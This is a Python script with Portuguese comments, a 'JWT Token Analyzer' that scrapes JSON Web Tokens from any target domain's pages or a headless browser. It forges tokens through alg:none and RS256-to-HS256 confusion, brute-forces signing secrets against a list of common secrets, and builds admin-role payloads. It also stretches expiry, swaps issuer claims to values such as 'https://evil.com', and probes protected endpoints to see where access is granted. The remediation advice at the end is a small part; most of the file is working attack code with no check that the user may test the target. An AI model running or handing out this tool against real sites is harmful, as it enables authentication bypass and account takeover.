#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
JWT Token Analyzer — Versao Completa e Funcional
Analisa, testa e explora JWTs capturados do browser
"""

import sys
import json
import time
import hashlib
import hmac
import base64
import urllib.request
import urllib.error
import ssl
import re
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path

try:
    from token_hunter import TokenHunter
    TOKEN_HUNTER_AVAILABLE = True
except ImportError:
    TOKEN_HUNTER_AVAILABLE = False


@dataclass
class JWTResult:
    """Resultado de teste JWT"""
    technique: str
    success: bool
    severity: str
    details: str = ""
    payload: str = ""
    signature: str = ""
    modified_token: str = ""

    def to_dict(self) -> Dict:
        return {
            'technique': self.technique,
            'success': self.success,
            'severity': self.severity,
            'details': self.details,
            'payload_preview': self.payload[:80] if self.payload else '',
            'modified_token_preview': self.modified_token[:80] if self.modified_token else '',
        }


class JWTAnalyzer:
    """Analisador e explorador completo de tokens JWT"""

    # Dicionario expandido de secrets comuns
    COMMON_SECRETS = [
        # Secrets genericos
        'secret', 'password', 'jwt_secret', 'your-256-bit-secret',
        'supersecret', 'changeme', 'test', 'dev', 'production',
        'your_secret_key', 'my_secret', 'jwt', 'token',
        'keyboard cat', 'your-secret', 'secret-key',
        'mysecret', 'secret123', '123456', 'password123',
        'jwt_secret_key', 'your_jwt_secret', 'secret_key',
        # Framework-specific
        'django-insecure', 'SECRET_KEY', 'APP_SECRET',
        'railssecret', 'SECRET_KEY_BASE', 'MONGOHQ_URL',
        # Comuns em tutoriais
        'mysecret', 'abc123', '1234567890', 'qwerty',
        'letmein', 'welcome', 'monkey', 'dragon',
        'master', 'trustno1', 'iloveyou', 'sunshine',
        # Node/Express
        'expressSecret', 'sessionSecret', 'cookieSecret',
        # Python
        'flask_secret', 'SECRET', 'authlib_encrypt_key',
        # Java
        'jwtSignKey', 'jwt.secret', 'secret123456',
        # Generic placeholders
        'YOUR_SECRET_KEY', 'your_secret_here', 'CHANGE_ME',
        # Comuns em apps brasileiros
        'token123', 'appsecret', 'api_secret', 'key123',
    ]

    # Payloads maliciosos para privilege escalation
    MALICIOUS_PAYLOADS = [
        {"admin": True, "role": "admin"},
        {"user_id": 1, "role": "admin", "permissions": ["all"]},
        {"sub": "1", "role": "admin", "iat": int(time.time())},
        {"iss": "admin", "role": "admin"},
        {"role": "superadmin", "level": 99},
        {"is_admin": True, "permissions": ["*"]},
        {"userType": "admin", "tier": "premium"},
    ]

    # Endpoints comuns para testar exploit
    COMMON_ENDPOINTS = [
        '/api/user', '/api/profile', '/api/account', '/api/auth/user',
        '/api/v1/user', '/api/v1/profile', '/user', '/profile',
        '/account', '/dashboard', '/admin', '/api/admin',
        '/api/users/me', '/api/auth/me', '/me',
    ]

    def __init__(self, target: str, timeout: int = 10):
        self.target = target
        self.timeout = timeout
        self.ctx = ssl.create_default_context()
        self.found_tokens: List[Dict] = []
        self.test_results: List[JWTResult] = []

    # ================================================================
    # METODOS UTILS
    # ================================================================

    def _b64url_decode(self, data: str) -> bytes:
        padding = 4 - len(data) % 4
        if padding != 4:
            data += '=' * padding
        return base64.urlsafe_b64decode(data)

    def _b64url_encode(self, data: bytes) -> str:
        return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')

    def decode_jwt(self, token: str) -> Optional[Dict]:
        """Decodifica JWT sem verificar signature"""
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return None
            header = json.loads(self._b64url_decode(parts[0]))
            payload = json.loads(self._b64url_decode(parts[1]))
            return {
                'header': header,
                'payload': payload,
                'signature': parts[2],
                'raw': token,
                'algo': header.get('alg', 'unknown'),
            }
        except Exception:
            return None

    # ================================================================
    # EXTRACAO DE TOKENS
    # ================================================================

    def extract_from_page(self, url: str) -> List[str]:
        """Extrai tokens JWT da pagina (page source)"""
        tokens = []
        try:
            req = urllib.request.Request(url, headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            })
            with urllib.request.urlopen(req, timeout=self.timeout, context=self.ctx) as resp:
                body = resp.read().decode('utf-8', errors='ignore')

                # Pattern JWT
                jwt_pattern = r'eyJ[A-Za-z0-9-_]+\.eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+'
                matches = re.findall(jwt_pattern, body)
                tokens.extend(matches)

                # Patterns alternativos
                patterns = [
                    r'"token"\s*:\s*"([^"]+)"',
                    r'"access_token"\s*:\s*"([^"]+)"',
                    r'"bearer"\s*:\s*"([^"]+)"',
                    r'"jwt"\s*:\s*"([^"]+)"',
                    r'Authorization:\s*Bearer\s+([A-Za-z0-9\-_.]+)',
                    r'window\.(token|jwt|accessToken)\s*=\s*["\']([^"\']+)["\']',
                ]
                for pattern in patterns:
                    matches = re.findall(pattern, body, re.IGNORECASE)
                    tokens.extend(matches)

        except Exception as e:
            print(f"  [ERROR] Page extraction failed: {e}")

        return list(set(tokens))

    def extract_from_browser(self) -> List[Dict]:
        """Extrai tokens do navegador via Selenium (metodo real)"""
        if not TOKEN_HUNTER_AVAILABLE:
            print("  [WARN] TokenHunter nao disponivel (selenium nao instalado)")
            return []

        print("  [BROWSER] Iniciando captura via browser...")
        hunter = TokenHunter(self.target, headless=True)

        try:
            result = hunter.run()
            tokens = []

            # JWT tokens do browser
            for jwt_info in result.get('jwt_tokens', []):
                token = jwt_info['token']
                source = jwt_info['source']
                decoded = jwt_info.get('decoded', {})
                tokens.append({
                    'token': token,
                    'source': source,
                    'decoded': decoded,
                    'extracted_at': datetime.now().isoformat(),
                })
                print(f"    [JWT] From {source}: {token[:50]}...")

            # Tambem capturar tokens nao-JWT (session cookies, etc)
            all_tokens = result.get('all_tokens', {})
            for key, value in all_tokens.items():
                if isinstance(value, str) and len(value) > 20 and '.' not in value:
                    tokens.append({
                        'token': value,
                        'source': f'non_jwt_{key}',
                        'decoded': None,
                        'extracted_at': datetime.now().isoformat(),
                    })

            hunter.close()
            return tokens

        except Exception as e:
            print(f"  [ERROR] Browser extraction failed: {e}")
            hunter.close()
            return []

    def extract_all(self) -> List[Dict]:
        """Extrai tokens de todas as fontes possiveis"""
        print("\n  [EXTRACT] Searching for JWT tokens...")
        tokens = []

        # Fonte 1: Browser (mais confiavel)
        browser_tokens = self.extract_from_browser()
        tokens.extend(browser_tokens)

        # Fonte 2: Page source (fallback)
        if not tokens:
            print("  [FALLBACK] Trying page source extraction...")
            raw_tokens = self.extract_from_page(f"https://{self.target}")
            for tok in raw_tokens[:5]:
                tokens.append({
                    'token': tok,
                    'source': 'page_source',
                    'decoded': self.decode_jwt(tok),
                    'extracted_at': datetime.now().isoformat(),
                })

        self.found_tokens = tokens
        print(f"  [FOUND] {len(tokens)} token(s) extracted")
        return tokens

    # ================================================================
    # TESTES DE VULNERABILIDADE
    # ================================================================

    def test_algorithm_confusion(self, token_info: Dict) -> List[JWTResult]:
        """Testa algorithm confusion attacks"""
        results = []
        decoded = token_info.get('decoded') or self.decode_jwt(token_info['token'])

        if not decoded:
            return results

        original_algo = decoded['header'].get('alg', 'HS256')

        # Attack 1: alg=none
        try:
            new_header = self._b64url_encode(json.dumps({'alg': 'none', 'typ': 'JWT'}).encode())
            new_payload = self._b64url_encode(json.dumps(decoded['payload']).encode())
            fake_token = f"{new_header}.{new_payload}."

            results.append(JWTResult(
                technique="Algorithm Confusion: none",
                success=False,
                severity="CRITICAL",
                details=f"Original algo: {original_algo}. Token alg:none criado.",
                modified_token=fake_token,
            ))
        except Exception:
            pass

        # Attack 2: RS256 -> HS256 (usar signature como secret)
        if original_algo.upper() in ('RS256', 'RS384', 'RS512', 'ES256', 'ES384'):
            try:
                new_header = self._b64url_encode(json.dumps({'alg': 'HS256', 'typ': 'JWT'}).encode())
                new_payload = self._b64url_encode(json.dumps(decoded['payload']).encode())
                fake_sig = self._b64url_encode(hmac.new(
                    decoded['signature'].encode(),
                    f"{new_header}.{new_payload}".encode(),
                    hashlib.sha256
                ).digest())
                fake_token = f"{new_header}.{new_payload}.{fake_sig}"

                results.append(JWTResult(
                    technique=f"Algorithm Confusion: {original_algo}->HS256",
                    success=False,
                    severity="CRITICAL",
                    details="Usar assinatura RS como secret HMAC",
                    modified_token=fake_token,
                ))
            except Exception:
                pass

        return results

    def test_weak_secrets(self, token_info: Dict) -> List[JWTResult]:
        """Testa secrets fracos/comuns via brute force"""
        results = []
        decoded = token_info.get('decoded') or self.decode_jwt(token_info['token'])

        if not decoded:
            return results

        header_b64 = self._b64url_encode(json.dumps({'alg': 'HS256', 'typ': 'JWT'}).encode())
        payload_b64 = self._b64url_encode(json.dumps(decoded['payload']).encode())
        message = f"{header_b64}.{payload_b64}"
        original_sig = decoded['signature']

        print(f"  [BRUTE] Testing {len(self.COMMON_SECRETS)} common secrets...")

        for i, secret in enumerate(self.COMMON_SECRETS):
            try:
                computed_sig = self._b64url_encode(hmac.new(
                    secret.encode(),
                    message.encode(),
                    hashlib.sha256
                ).digest())

                if computed_sig == original_sig:
                    results.append(JWTResult(
                        technique="Weak Secret Found",
                        success=True,
                        severity="CRITICAL",
                        details=f"Secret encontrado: '{secret}'",
                        signature=computed_sig,
                    ))
                    print(f"  [FOUND] Weak secret: '{secret}'")
                    break
            except Exception:
                continue

        # Verificar signature length como indicador
        if len(original_sig) < 24:
            results.append(JWTResult(
                technique="Short Signature",
                success=False,
                severity="HIGH",
                details=f"Signature curta ({len(original_sig)} chars) pode indicar weakness",
            ))

        return results

    def test_privilege_escalation(self, token_info: Dict) -> List[JWTResult]:
        """Tenta escalacao de privilegio modificando payload"""
        results = []
        decoded = token_info.get('decoded') or self.decode_jwt(token_info['token'])

        if not decoded:
            return results

        current_role = decoded['payload'].get('role', 'unknown')
        current_user = decoded['payload'].get('user_id') or decoded['payload'].get('sub', 'unknown')

        print(f"  [PRIVESC] Current role: {current_role}, user: {current_user}")

        # Gerar variants de payload malicioso
        variants = [
            {"role": "admin"},
            {"admin": True},
            {"is_admin": True},
            {"permissions": ["*"]},
            {"level": 99},
            {"tier": "premium"},
        ]

        for variant in variants:
            for algo in ['HS256', 'HS384', 'HS512', 'none']:
                try:
                    header = {'alg': algo, 'typ': 'JWT'}
                    header_b64 = self._b64url_encode(json.dumps(header).encode())
                    merged = {**decoded['payload'], **variant}
                    payload_b64 = self._b64url_encode(json.dumps(merged).encode())

                    if algo == 'none':
                        sig = ''
                    else:
                        # Tentar com secrets comuns
                        sig = None
                        for secret in self.COMMON_SECRETS[:10]:
                            try:
                                sig_bytes = hmac.new(
                                    secret.encode(),
                                    f"{header_b64}.{payload_b64}".encode(),
                                    getattr(hashlib, algo.lower())
                                ).digest()
                                sig = self._b64url_encode(sig_bytes)
                                break
                            except:
                                continue
                        if sig is None:
                            sig = 'fakesig'

                    fake_token = f"{header_b64}.{payload_b64}.{sig}"

                    results.append(JWTResult(
                        technique=f"Privilege Escalation: {list(variant.keys())[0]}={list(variant.values())[0]}",
                        success=False,
                        severity="HIGH",
                        details=f"Payload modificado com alg:{algo}",
                        modified_token=fake_token,
                    ))
                except Exception:
                    pass

        return results

    def test_expiration_manipulation(self, token_info: Dict) -> List[JWTResult]:
        """Testa manipulacao de expiracao"""
        results = []
        decoded = token_info.get('decoded') or self.decode_jwt(token_info['token'])

        if not decoded:
            return results

        payload = decoded['payload']

        # Verificar exp
        exp = payload.get('exp')
        if exp:
            exp_dt = datetime.fromtimestamp(exp)
            days_left = (exp_dt - datetime.utcnow()).days
            if days_left > 30:
                results.append(JWTResult(
                    technique="Long-lived Token",
                    success=False,
                    severity="MEDIUM",
                    details=f"Token válido por mais {days_left} dias (exp: {exp_dt.isoformat()})",
                ))

            # Tentar estender expiracao
            for extend_days in [365, 3650]:
                new_exp = int(time.time()) + (extend_days * 86400)
                new_payload = {**payload, 'exp': new_exp}
                new_payload_b64 = self._b64url_encode(json.dumps(new_payload).encode())
                results.append(JWTResult(
                    technique=f"Expiration Extension: +{extend_days} days",
                    success=False,
                    severity="MEDIUM",
                    details=f"Nova expiracao: {datetime.fromtimestamp(new_exp).isoformat()}",
                ))

        # Verificar nbf (not before)
        nbf = payload.get('nbf')
        if nbf:
            nbf_dt = datetime.fromtimestamp(nbf)
            if nbf_dt > datetime.utcnow():
                results.append(JWTResult(
                    technique="Future NBF",
                    success=False,
                    severity="LOW",
                    details=f"Token invalido antes de {nbf_dt.isoformat()}",
                ))

        # Verificar jti (replay)
        jti = payload.get('jti')
        if jti:
            results.append(JWTResult(
                technique="JTI Replay",
                success=False,
                severity="MEDIUM",
                details=f"JTI unico: {jti}. Testar replay com mesmo JTI",
            ))

        return results

    def test_aud_iss_claims(self, token_info: Dict) -> List[JWTResult]:
        """Testa manipulacao de audience e issuer"""
        results = []
        decoded = token_info.get('decoded') or self.decode_jwt(token_info['token'])

        if not decoded:
            return results

        payload = decoded['payload']

        # Audience manipulation
        aud = payload.get('aud')
        if aud:
            for new_aud in ['admin', 'system', 'internal', 'api', '*']:
                results.append(JWTResult(
                    technique=f"Audience Manipulation: {new_aud}",
                    success=False,
                    severity="HIGH",
                    details=f"Original: {aud}, Testar com: {new_aud}",
                ))

        # Issuer manipulation
        iss = payload.get('iss')
        if iss:
            for new_iss in ['admin', 'system', 'trusted.internal', 'https://evil.com']:
                results.append(JWTResult(
                    technique=f"Issuer Manipulation: {new_iss}",
                    success=False,
                    severity="HIGH",
                    details=f"Original: {iss}, Testar com: {new_iss}",
                ))

        return results

    def test_token_against_endpoint(self, endpoint: str, token: str,
                                     method: str = 'GET', extra_headers: Dict = None) -> Tuple[bool, int, str]:
        """Testa um token contra um endpoint especifico"""
        try:
            url = f"https://{self.target}{endpoint}"
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Authorization': f'Bearer {token}',
                'Accept': 'application/json',
            }
            if extra_headers:
                headers.update(extra_headers)

            req = urllib.request.Request(url, headers=headers, method=method)
            with urllib.request.urlopen(req, timeout=10, context=self.ctx) as resp:
                body = resp.read().decode('utf-8', errors='ignore')[:500]
                return True, resp.status, body
        except urllib.error.HTTPError as e:
            body = e.read().decode('utf-8', errors='ignore')[:200] if e.fp else ''
            return False, e.code, body
        except Exception as e:
            return False, 0, str(e)

    def exploit_against_endpoints(self, token: str,
                                   endpoints: List[str] = None) -> List[Dict]:
        """Testa exploit contra endpoints protegidos"""
        if endpoints is None:
            endpoints = self.COMMON_ENDPOINTS

        results = []
        print(f"  [EXPLOIT] Testing {len(endpoints)} endpoints...")

        for endpoint in endpoints:
            success, status, body = self.test_token_against_endpoint(endpoint, token)

            finding = {
                'endpoint': endpoint,
                'method': 'GET',
                'status_code': status,
                'accessible': success and status == 200,
                'response_preview': body[:100] if body else '',
            }

            if success and status == 200:
                print(f"    [ACCESS] {endpoint} -> 200 OK")
                finding['exploit_success'] = True
            elif status == 401:
                finding['exploit_success'] = False
            elif status == 403:
                print(f"    [BLOCKED] {endpoint} -> 403 Forbidden")

            results.append(finding)

        return results

    # ================================================================
    # ANALISE COMPLETA
    # ================================================================

    def run_full_analysis(self, token: str = None) -> Dict:
        """Executa analise completa de um JWT"""
        print("\n" + "=" * 60)
        print("  JWT TOKEN ANALYZER v2.0")
        print("=" * 60)

        all_results = {
            'target': self.target,
            'timestamp': datetime.now().isoformat(),
            'tokens_found': [],
            'analysis_results': [],
            'exploit_results': [],
            'summary': {},
        }

        # Extrair tokens
        if not token:
            tokens_info = self.extract_all()
        else:
            tokens_info = [{
                'token': token,
                'source': 'manual',
                'decoded': self.decode_jwt(token),
                'extracted_at': datetime.now().isoformat(),
            }]

        all_results['tokens_found'] = [
            {'token_preview': t['token'][:50], 'source': t['source']}
            for t in tokens_info
        ]

        # Analisar cada token
        for i, token_info in enumerate(tokens_info[:3], 1):
            tok = token_info['token']
            print(f"\n[ANALYZE] Token {i}/{min(3, len(tokens_info))} from {token_info.get('source', 'unknown')}")

            decoded = token_info.get('decoded') or self.decode_jwt(tok)
            if not decoded:
                print(f"  [ERROR] Failed to decode token")
                continue

            print(f"  Header: {json.dumps(decoded['header'])}")
            print(f"  Payload keys: {list(decoded['payload'].keys())}")

            # Verificar claims
            payload = decoded['payload']
            for key in ['role', 'admin', 'user_id', 'sub', 'email', 'name', 'permissions']:
                if key in payload:
                    print(f"  {key}: {payload[key]}")

            # Executar testes
            print(f"\n  [TEST] Algorithm confusion...")
            all_results['analysis_results'].extend(
                self.test_algorithm_confusion(token_info)
            )

            print(f"  [TEST] Weak secrets...")
            all_results['analysis_results'].extend(
                self.test_weak_secrets(token_info)
            )

            print(f"  [TEST] Privilege escalation...")
            all_results['analysis_results'].extend(
                self.test_privilege_escalation(token_info)
            )

            print(f"  [TEST] Expiration manipulation...")
            all_results['analysis_results'].extend(
                self.test_expiration_manipulation(token_info)
            )

            print(f"  [TEST] Audience/Issuer claims...")
            all_results['analysis_results'].extend(
                self.test_aud_iss_claims(token_info)
            )

            # Testar exploit contra endpoints
            print(f"  [EXPLOIT] Testing against endpoints...")
            exploit_results = self.exploit_against_endpoints(tok)
            all_results['exploit_results'].append({
                'token_source': token_info.get('source', 'unknown'),
                'endpoints_tested': len(exploit_results),
                'access_granted': [e for e in exploit_results if e.get('accessible')],
                'results': exploit_results[:5],  # Limitar output
            })

        # Resumo
        critical = [r for r in all_results['analysis_results'] if r.severity == 'CRITICAL' and r.success]
        high = [r for r in all_results['analysis_results'] if r.severity == 'HIGH']
        medium = [r for r in all_results['analysis_results'] if r.severity == 'MEDIUM']
        exploit_successes = sum(
            len(e.get('access_granted', []))
            for e in all_results.get('exploit_results', [])
        )

        all_results['summary'] = {
            'total_tests': len(all_results['analysis_results']),
            'critical_vulns': len(critical),
            'high_vulns': len(high),
            'medium_vulns': len(medium),
            'successful_bypasses': len(critical),
            'exploit_successes': exploit_successes,
            'recommendations': self._generate_recommendations(all_results),
        }

        # Print summary
        print("\n" + "=" * 60)
        print("  JWT ANALYSIS SUMMARY")
        print("=" * 60)
        print(f"  Total tests: {all_results['summary']['total_tests']}")
        print(f"  Critical: {all_results['summary']['critical_vulns']}")
        print(f"  High: {all_results['summary']['high_vulns']}")
        print(f"  Medium: {all_results['summary']['medium_vulns']}")
        print(f"  Exploit successes: {all_results['summary']['exploit_successes']}")
        print("=" * 60)

        return all_results

    def _generate_recommendations(self, results: Dict) -> List[str]:
        """Gera recomendacoes baseadas nos resultados"""
        recs = []
        findings = results.get('analysis_results', [])

        if any(r.severity == 'CRITICAL' and r.success for r in findings):
            recs.append("CRITICAL: Weak JWT secret found — rotate immediately and use strong random key")

        if any('Algorithm Confusion' in r.technique for r in findings):
            recs.append("CRITICAL: Algorithm confusion vulnerability — enforce alg whitelist on server")

        if any('Privilege Escalation' in r.technique for r in findings):
            recs.append("HIGH: Privilege escalation possible — sign tokens server-side with validated payload")

        if any('Long-lived Token' in r.technique for r in findings):
            recs.append("MEDIUM: Token expiration too long — reduce to 15min-1hr with refresh tokens")

        if any('Short Signature' in r.technique for r in findings):
            recs.append("HIGH: Weak signature length — use at least 256-bit secret")

        exploit_count = results.get('summary', {}).get('exploit_successes', 0)
        if exploit_count > 0:
            recs.append(f"CRITICAL: {exploit_count} endpoint(s) accessible with forged token — implement proper auth")

        if not recs:
            recs.append("No critical JWT vulnerabilities found. Continue monitoring.")

        return recs


def main():
    import argparse
    parser = argparse.ArgumentParser(description='JWT Token Analyzer v2.0')
    parser.add_argument('target', help='Target domain')
    parser.add_argument('--token', '-t', help='JWT token to analyze (auto-extracts if not provided)')
    parser.add_argument('--output', '-o', help='Output file (JSON)')
    parser.add_argument('--exploit', '-e', action='store_true', help='Test exploits against endpoints')
    parser.add_argument('--browser', '-b', action='store_true', help='Use browser-based extraction')

    args = parser.parse_args()

    analyzer = JWTAnalyzer(args.target)

    if args.browser:
        print("[INFO] Using browser-based token extraction...")
        analyzer.extract_all()

    result = analyzer.run_full_analysis(args.token)

    if args.output:
        with open(args.output, 'w', encoding='utf-8') as f:
            json.dump(result, f, indent=2, ensure_ascii=False, default=str)
        print(f"\n[SAVE] Results saved to {args.output}")

    return result


if __name__ == "__main__":
    main()
